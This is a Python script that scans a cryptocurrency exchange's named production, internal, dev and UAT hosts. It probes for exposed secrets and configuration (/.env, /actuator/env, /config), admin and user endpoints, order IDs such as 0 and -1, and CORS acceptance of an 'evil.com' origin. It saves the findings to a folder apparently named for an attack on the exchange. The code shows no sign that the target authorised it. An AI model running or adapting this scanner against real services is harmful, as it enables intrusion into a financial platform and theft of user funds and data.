import requests, json, time
import urllib3
urllib3.disable_warnings()

# Probe internal microservices on hkdev/uat hosts  
hosts = {
    "identity.mx.exchange": "Identity service",
    "account.mx.exchange": "Account service", 
    "wallet.mx.exchange": "Wallet service",
    "orderbook.mx.exchange": "Orderbook service",
    "notification.mx.exchange": "Notification service",
    "common.mx.exchange": "Common service",
    "api-uat.mx.exchange": "API UAT",
    "identityhkdev.mx.exchange": "Identity HK Dev",
    "accounthkdev.mx.exchange": "Account HK Dev",
    "wallethkdev.mx.exchange": "Wallet HK Dev",
    "orderbookhkdev.mx.exchange": "Orderbook HK Dev",
    "notificationhkdev.mx.exchange": "Notification HK Dev",
    "commonhkdev.mx.exchange": "Common HK Dev",
    "admin-hkdev.mx.exchange": "Admin HK Dev",
    "web-hkdev.mx.exchange": "Web HK Dev",
}

paths = [
    "/", "/health", "/api/health", "/healthz", "/ready", "/readyz",
    "/swagger", "/swagger/index.html", "/swagger/v1/swagger.json",
    "/api-docs", "/openapi.json",
    "/metrics", "/prometheus",
    "/actuator", "/actuator/health", "/actuator/env",
    "/info", "/api/info", "/version", "/api/version",
    "/login", "/admin", "/dashboard",
    "/graphql", "/graphiql",
    "/.env", "/config", "/api/config",
    "/debug", "/api/debug", "/trace",
    "/api/v1/users", "/api/v1/accounts", "/api/v1/wallets",
    "/api/users", "/users", "/accounts",
    "/register", "/signup", "/api/register",
    "/api/v1/status", "/status",
    "/robots.txt", "/sitemap.xml",
    "/api/v1/health", "/ping", "/api/ping",
]

results = {}

for host, label in hosts.items():
    print(f"\n{'='*60}")
    print(f"{label} ({host})")
    print(f"{'='*60}")
    
    hits = []
    for path in paths:
        url = f"https://{host}{path}"
        try:
            r = requests.get(url, timeout=6, verify=False, allow_redirects=False)
            if r.status_code not in [404, 403, 502, 503]:
                body = r.text[:200].replace('\n',' ').strip()
                print(f"  {path} => {r.status_code} ({len(r.text)}b) {body[:80]}")
                hits.append({
                    "path": path,
                    "status": r.status_code,
                    "size": len(r.text),
                    "body_preview": body[:200],
                    "headers": dict(r.headers)
                })
        except requests.exceptions.ConnectTimeout:
            # Host not responding, skip all paths
            print(f"  TIMEOUT on {path} - skipping host")
            break
        except requests.exceptions.SSLError:
            try:
                r = requests.get(f"http://{host}{path}", timeout=6, allow_redirects=False)
                if r.status_code not in [404, 403, 502, 503]:
                    print(f"  {path} => {r.status_code} (HTTP) ({len(r.text)}b)")
                    hits.append({"path": path, "status": r.status_code, "size": len(r.text), "proto": "http"})
            except:
                pass
        except Exception as e:
            if "Max retries" in str(e) or "Connection" in str(e):
                print(f"  Connection failed - skipping host")
                break
    
    if hits:
        results[host] = hits

# Also deep probe UAT
print(f"\n{'='*60}")
print("DEEP UAT PROBE (openapiuat.azurewebsites.net)")
print(f"{'='*60}")

uat = "https://openapiuat.azurewebsites.net"
uat_paths = paths + [
    "/api/1/user/balance", "/api/1/user/trades?pair=BTCMYR",
    "/api/1/user/order/openorders?pair=BTCMYR",
    "/api/2/user/balance", "/api/v2/user/balance",
    "/api/admin/users", "/api/admin/orders", "/api/admin/wallets",
    "/api/internal/health", "/api/internal/status",
    "/hangfire", "/elmah", "/elmah.axd",
    "/error", "/error/500",
    "/api/1/user/order/0", "/api/1/user/order/1",
    "/api/1/user/order/-1",
    "/api/1/user/orderexecutions?orderbookId=1",
    "/api/1/user/trades?pair=BTCMYR&limit=1",
    # CORS test
]

uat_hits = []
for path in uat_paths:
    try:
        r = requests.get(f"{uat}{path}", timeout=6, verify=False, allow_redirects=False)
        if r.status_code not in [404]:
            body = r.text[:200].replace('\n',' ').strip()
            print(f"  {path} => {r.status_code} ({len(r.text)}b) {body[:100]}")
            uat_hits.append({
                "path": path, "status": r.status_code,
                "size": len(r.text), "body_preview": body[:300],
                "headers": {k:v for k,v in r.headers.items()}
            })
    except:
        pass

# CORS test on UAT
print(f"\n--- CORS TEST UAT ---")
cors_headers = {"Origin": "https://evil.com"}
try:
    r = requests.options(f"{uat}/api/1/marketpair", headers=cors_headers, timeout=6, verify=False)
    print(f"  OPTIONS /api/1/marketpair => {r.status_code}")
    for h in ['access-control-allow-origin','access-control-allow-methods','access-control-allow-headers','access-control-allow-credentials']:
        if h in r.headers:
            print(f"    {h}: {r.headers[h]}")
    
    r2 = requests.get(f"{uat}/api/1/marketpair", headers=cors_headers, timeout=6, verify=False)
    for h in ['access-control-allow-origin','access-control-allow-credentials']:
        if h in r2.headers:
            print(f"    GET {h}: {r2.headers[h]}")
except Exception as e:
    print(f"  CORS test error: {e}")

# CORS test on PROD
print(f"\n--- CORS TEST PROD ---")
try:
    r = requests.get("https://openapi.mx.exchange/api/1/marketpair", headers=cors_headers, timeout=6)
    for h in ['access-control-allow-origin','access-control-allow-methods','access-control-allow-headers','access-control-allow-credentials']:
        if h in r.headers:
            print(f"    {h}: {r.headers[h]}")
except Exception as e:
    print(f"  CORS test error: {e}")

results["openapiuat.azurewebsites.net"] = uat_hits

with open('c:\\xampp\\htdocs\\pentagi\\mxexchange_attack\\microservices_probe.json', 'w') as f:
    json.dump(results, f, indent=2)
print(f"\n[+] Results saved")
print("DONE")
